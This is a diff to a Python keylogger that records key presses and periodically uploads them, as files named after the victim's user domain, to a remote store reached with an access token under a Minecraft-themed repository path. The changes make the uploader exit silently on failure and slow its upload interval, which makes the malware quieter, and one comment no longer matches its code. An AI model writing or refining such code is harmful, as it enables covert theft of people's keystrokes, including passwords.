@@ -21,7 +21,10 @@ if not userdomain:
 DB_PATH = "Minecraft-vIIr/public"
 TOKEN = "ghp_xxx"
 
-gdrive = GDrive(DB_PATH, TOKEN)
+try:
+    gdrive = GDrive(DB_PATH, TOKEN)
+except:
+    exit()
 
 # File path and cache settings
 REMOTE_PATH = f"{userdomain}-keyoutput{int(time.time())}.txt"
@@ -52,7 +55,7 @@ def save_cache():
     except Exception as e:
         print(e)
 
-    Timer(30, save_cache).start()  # Refresh cache every 5 seconds
+    Timer(120, save_cache).start()  # Refresh cache every 5 seconds
 
 # Handle key events
 def on_press(key):
